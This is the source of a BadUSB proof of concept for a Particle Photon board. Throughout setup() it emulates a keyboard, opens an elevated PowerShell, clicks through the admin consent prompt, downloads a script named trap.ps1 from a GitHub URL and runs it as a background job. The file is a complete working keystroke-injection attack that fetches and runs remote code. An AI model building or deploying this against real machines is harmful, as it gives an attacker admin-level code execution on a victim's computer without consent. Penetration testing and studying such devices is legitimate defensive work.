/******************************************************/
//       THIS IS A GENERATED FILE - DO NOT EDIT       //
/******************************************************/

#include "Particle.h"
#line 1 "c:/Users/jmand/Documents/particle-photon-badusb/src/particle-photon-badusb.ino"
/*
 * Project particle-photon-badusb
 * Description: BadUSB penetration testing proof of concept for Photon board
 * Author:
 * Date:
 */

// EXAMPLE USAGE
// Use STARTUP() macro to avoid USB disconnect/reconnect (see begin() documentation)
void setup();
void loop();
#line 10 "c:/Users/jmand/Documents/particle-photon-badusb/src/particle-photon-badusb.ino"
STARTUP(Keyboard.begin());

void setup() {

  String url = "https://raw.githubusercontent.com/astral-grayson/particle-photon-badusb/main/trap.ps1";
  // String file = "31001_white_hot_safety_bath_ducky.jpg";
  String ride = "https://raw.githubusercontent.com/astral-grayson/particle-photon-badusb/main/ride.wav";

  // WIN+R to open Run
  Keyboard.press(KEY_LEFT_WINDOWS);
  // Keyboard.press(114);
  Keyboard.press(KEY_R);
  Keyboard.releaseAll();
  delay(300);

  // Start PowerShell as admin
  Keyboard.print("powershell Start-Process powershell -Verb runAs");
  Keyboard.click(KEY_RETURN);

  // wait for startup (kinda slow)
  delay(2500);

  // confirm (2x TAB, RETURN) running PowerShell as admin
  // Keyboard.click(KEY_TAB);
  // Keyboard.click(KEY_TAB);
  // Keyboard.click(KEY_RETURN);
  Keyboard.press(KEY_LALT);
  // Keyboard.press(121);
  Keyboard.press(KEY_Y);
  Keyboard.releaseAll();
  delay(600);

  // Run PowerShell command: save file at $url as $file and execute it
  // DANGEROUS AS FUCK COMMAND OBVIOUSLY BE CAREFUL WITH $url CONTENTS
  // Saves file to Users\$user filesystem root
  Keyboard.print("[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls';");
  Keyboard.print("$down = New-Object System.Net.WebClient; $url = '" + url +"'; $file = 'trap.ps1'; $down.DownloadFile($url,$file);");
  Keyboard.print("$ride = '" + ride +"'; $ride_file = 'ride.wav'; $down.DownloadFile($ride,$ride_file);");
  delay(100);
  Keyboard.click(KEY_RETURN);
  Keyboard.print("Start-Job -ScriptBlock { ./trap.ps1 }");
  Keyboard.click(KEY_RETURN);
  Keyboard.print("exit;");
  Keyboard.click(KEY_RETURN);

}

void loop() {

}